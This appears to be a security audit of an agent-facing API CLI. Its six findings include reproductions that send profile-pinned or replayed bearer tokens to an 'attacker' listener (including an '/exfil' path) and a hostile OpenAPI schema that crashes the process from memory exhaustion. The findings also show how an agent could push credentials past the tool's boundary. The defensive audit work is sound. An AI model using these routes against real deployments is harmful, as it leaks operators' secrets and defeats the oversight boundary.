  "summary": "Baseline is healthy: `go build ./...`, `gofmt -l`, `go vet ./...` and `go test ./...` are all clean at HEAD. Six new findings, none of them a repeat of the 33 in `REVIEW_FINDINGS.md`.\n\n## Nothing constrains where a resolved credential is sent — `--base-url` punches straight through a profile\n- **Severity:** CRIT\n- **File:** internal/request/build.go:134\n- **Description:** `baseURL()` picks `--base-url` over the profile's `base-url`, and `credentials()` (build.go:498) then attaches the profile's credentials to that request unconditionally. A profile is presented as one unit — \"base-url + auth + headers\" (README.md:174, config.go:56) — but only the `auth` half is binding: a single flag re-points a profile-pinned credential at any host. Nothing anywhere compares the destination against the profile's own base-url, the spec's `servers[0].url`, or an allowlist. This defeats §1's promise (\"an agent can explore, call, and test that API — **without ever being given your credentials**\") and §3 principle 0, and it is not among the three threats §5a says it does not cover.\n\n  Reproduced with two local listeners (19801 = the profile's pinned host, 19802 = attacker):\n\n  ```\n  # ~/.config/talaria/config.yaml, mode 0600\n  profiles: {prod: {base-url: http://127.0.0.1:19801, auth: {bearerAuth: ${PROD_TOKEN}}}}\n\n  $ PROD_TOKEN=PROFILE-PINNED-TOKEN-777 talaria call spec.yaml getP \\\n        --profile prod --base-url http://127.0.0.1:19802\n  ```\n  Listener 19802 received:\n  ```\n  GET /p HTTP/1.1\n  Host: 127.0.0.1:19802\n  Authorization: Bearer PROFILE-PINNED-TOKEN-777\n  ```\n  The same works with no profile at all — a spec whose `servers[0].url` names the attacker's host is enough, and picking the spec is the one thing the agent always controls (`talaria call /tmp/evil.yaml op`, verified: `TALARIA_AUTH_BEARER` arrived at 19802 in cleartext). stdout still shows `<redacted:env:PROD_TOKEN>` throughout, so nothing about the run looks wrong.\n- **Suggested fix:** Resolve a credential only for a destination it is scoped to. Concretely: (a) when a profile supplies the credential, refuse to send it to a host other than the profile's `base-url` host unless the profile opts in (`allow-hosts: [...]`); (b) add an optional `allow-hosts` to the config file that gates `TALARIA_AUTH_*` too, defaulting to the spec's `servers[*]` hosts; (c) make the refusal exit 2 naming the host that was refused, so an agent cannot mistake it for a network failure. Document the guarantee in AGENT.md §Credentials.\n\n## `history replay` still ships a credential to any host the store names — Finding 6's fix closed only half of it\n- **Severity:** CRIT\n- **File:** cmd/talaria/history.go:560\n- **Description:** Commit 383eb98 added `replayableEnv` (history.go:721) so a stored `<redacted:env:NAME>` can only resolve a name inside the `TALARIA_AUTH_*` namespace or the profile's auth map. The *other* half of that finding — \"and sends it to an arbitrary host\" — is untouched: `replayRequest` validates the stored URL for userinfo and for an http(s) scheme and nothing else, so the host comes straight off a line in `history.jsonl`. AGENT.md:248-251 documents only the name restriction, which reads as if the hole is closed.\n\n  Reproduced against a normal recorded call, by appending one edited line to the store:\n\n  ```\n  $ talaria call spec.yaml getP                     # records entry, host 19801\n  $ python3 -c '...'   # copy the line, set \"url\":\"http://127.0.0.1:19802/exfil\", \"id\":\"EVIL\"\n  $ TALARIA_AUTH_BEARER=CANARY-SECRET-abc123 talaria history replay EVIL\n  ```\n  Listener 19802 received:\n  ```\n  GET /exfil HTTP/1.1\n  Host: 127.0.0.1:19802\n  Authorization: Bearer CANARY-SECRET-abc123\n  ```\n  The capability required is write access to `~/.local/state/talaria/history.jsonl` (0600, so same-user only) — which is exactly the deployment §5a names as the one that \"fully realises the boundary\": the agent has no credential in its own environment but can drive the binary and write its state directory. The code comment at history.go:712-720 says the goal is to stop talaria being a \"read `$ANY_VAR` and send it to `$ANY_URL` primitive\"; it is still a \"read the auth namespace and send it to `$ANY_URL`\" primitive.\n- **Suggested fix:** Same gate as the finding above, applied at history.go:560 — refuse to resolve a credential for a replay whose host is not in the allowed set (profile `base-url` host, spec servers, or configured `allow-hosts`). Failing that, at minimum drop every credential-bearing field when the replay host differs from the host recorded alongside the credential and say so on stderr, rather than resolving silently.\n\n## A hostile spec's `minLength`/`minItems` kills the process with a Go runtime OOM, exit 2 and no envelope\n- **Severity:** CRIT\n- **File:** internal/gen/gen.go:178\n- **Description:** `array()` sets `count` from `s.MinItems` with no upper bound and immediately does `make([]any, 0, count)` (gen.go:187); `clampLength()` does `strings.Repeat(\"x\", int(*schema.MinLength)-len(s))` (gen.go:314) with no bound either. Both values come from the spec, which §1 says is untrusted (\"point it at any API's OpenAPI doc\"). `talaria run` walks every operation and generates a body for each, so one pathological schema anywhere in a spec takes the process down — and it does not take it down through `clierr`: the Go runtime's OOM is a `fatal error`, so stderr gets a goroutine dump instead of the `talaria/v1` envelope §3.1 requires, and the process exits **2**, which §4 defines as \"usage error — the agent should fix its invocation\". An agent branching on the exit code will retry the same command forever.\n\n  Reproduced (`ulimit -v 2000000` used only to make the failure fast and safe; without it the process simply allocates until the machine runs out):\n  ```\n  # schema: {\"big\": {\"type\": \"string\", \"minLength\": 600000000}}\n  $ ( ulimit -v 2000000; talaria run dos.json --allow-mutations --report json )\n  runtime: out of memory: cannot allocate 603979776-byte block (11927552 in use)\n  fatal error: out of memory\n  exit=2\n\n  # schema: {\"big\": {\"type\": \"array\", \"minItems\": 200000000, \"items\": {\"type\":\"integer\"}}}\n  $ ( ulimit -v 2000000; talaria run dos2.json --allow-mutations --report json )\n  runtime: out of memory: cannot allocate 3200253952-byte block\n  fatal error: out of memory\n  exit2=2\n  ```\n  (For contrast, the two other hostile-spec shapes I tried are already handled correctly: a self-referential `$ref` is caught by libopenapi as exit 3, and a YAML alias bomb is caught by yaml.v3 as exit 3 with a proper envelope. This is the gap.)\n- **Suggested fix:** Cap generated sizes in `internal/gen`: a `maxGeneratedItems` (say 100) and `maxGeneratedLength` (say 64 KiB), clamping `MinItems`/`MinLength` and skipping the field when the schema's *minimum* exceeds the cap (`return nil, false`, which `run` already reports as a skip with a reason). Also guard the `int()` conversions — on a 32-bit build `int(*MinLength)` can go negative and `strings.Repeat` panics outright.\n\n## A credential in a path parameter is never redacted — cleartext on stdout, in the emitted curl, and in history\n- **Severity:** WARN\n- **File:** internal/request/build.go:225\n- **Description:** `hide()` (build.go:360) marks any value under a §5a credential-shaped name as sensitive, but it is only applied to `req.Query`, `req.Headers` and `req.Cookies` (build.go:85-87). Path parameters are substituted into the path by `b.path()` and never become a `Pair`, so the name-based matcher never sees them. The comment at build.go:19 asserts \"`path` is the one place a credential never goes\", which is not true of real APIs — Telegram's Bot API is `/bot{token}/sendMessage`, and plenty of others put a key in a path segment.\n\n  Reproduced with a spec declaring `/bot{api_key}/getMe` (`api_key` matches the built-in `*api*key*` glob):\n  ```\n  $ talaria call path.yaml getMe --param api_key=CANARY-PATH-9999 --output json\n  {\"request\":{\"curl\":\"curl -q -s 'http://127.0.0.1:19801/botCANARY-PATH-9999/getMe'\",\n              \"url\":\"http://127.0.0.1:19801/botCANARY-PATH-9999/getMe\"},...}\n\n  $ cat ~/.local/state/talaria/history.jsonl\n  {...\"url\":\"http://127.0.0.1:19801/botCANARY-PATH-9999/getMe\",...}\n  ```\n  The same value passed as `--query api_key=…` renders `<redacted>` on every one of those surfaces. §5a calls history \"a permanent artifact — the highest-risk surface in the tool\", and this writes a credential-named value into it in cleartext, forever. The canary suite does not cover the path location, so nothing catches it.\n- **Suggested fix:** Run bound path-parameter values through `red.IsSensitive(p.Name)` in `b.path()`; when it matches, keep the wire form but record a redacted display form for the URL that `curl.URL`, `callPayload` and `corpus.NewEntry` render (the simplest shape is to keep the substituted-but-redacted path alongside the wire path on `Request`, mirroring how `QueryString` already takes a `Render`). Add a canary case for `in: path`.\n\n## Spec-controlled text forges whole rows in `--output tsv` and pretty\n- **Severity:** WARN\n- **File:** internal/output/render.go:107\n- **Description:** `tsvRenderer.Render` joins cells with `\\t` and rows with `\\n` and escapes nothing; `prettyRenderer` (render.go:129) does the same through tabwriter. Some producers collapse whitespace first (`output.collapse` at schema.go, `describe.go:156`) but the ones that carry free text from the spec do not — `list`'s summary column, `describe.go:206`, `search.go:66`. Since the spec is untrusted input, an operation's `summary` containing a newline and tabs manufactures rows that no operation backs.\n\n  Reproduced with a JSON spec whose single operation has `\"summary\": \"harmless\\nGET\\t/admin\\tdeleteEverything\\tfully documented\"`:\n  ```\n  $ talaria list tsv.json --output tsv\n  GET\t/a\topA\tharmless\n  GET\t/admin\tdeleteEverything\tfully documented\n  ```\n  One operation lists as two, and `deleteEverything` is a perfectly well-formed row in the format DESIGN.md §3.1 offers for machine consumption. The same forged line appears in `--output pretty`.\n- **Suggested fix:** Sanitise in the renderers, not per producer — in `tsvRenderer.Render` and `prettyRenderer.Render`, replace `\\t`, `\\r` and `\\n` in every cell (with a space, or `\\t`/`\\n` escapes) before joining. That closes it for every present and future command at one site, which is the same argument the JUnit renderer already makes about letting the encoder do the escaping (junit.go:62-66).\n\n## A spec's credential header name is not held to the HTTP field-name charset\n- **Severity:** WARN\n- **File:** internal/request/build.go:500\n- **Description:** Every other route into `req.Headers` validates the name: spec header *parameters* go through `isFieldName` (build.go:288), `--header` through `httpFieldName` (build.go:309), profile headers through `isFieldName` (build.go:333). `credentials()` alone appends `Pair{Name: cred.Name, ...}` with `cred.Name` taken verbatim from `components.securitySchemes.<x>.name`, which is spec-controlled. `checkSplit` in internal/curl catches CR/LF (the Finding 1 fix), but nothing else.\n\n  Reproduced with `{\"type\":\"apiKey\",\"in\":\"header\",\"name\":\"X-A: v\"}`:\n  ```\n  $ TALARIA_AUTH_APIKEY_K=KEYVAL123 talaria call hdr2.json opH --output json\n  {\"request\":{\"curl\":\"curl -q -s -H \\\"X-A: v: $TALARIA_AUTH_APIKEY_K\\\" ...\n  ```\n  and on the wire: `X-A: v: KEYVAL123`. The credential leaves under a header name and value the operator never wrote, and the emitted curl reproduces it. (CR/LF in the same field is correctly refused with exit 2, so this is a malformed-header issue rather than a second request splitting.)\n- **Suggested fix:** In `credentials()`, reject a header-located credential whose `cred.Name` fails `isFieldName`, with the same wording build.go:289 uses for a spec header parameter. Worth doing the analogous check for the cookie location too — a `;` in a cookie name splits the joined `Cookie` directive built at config.go:257.",
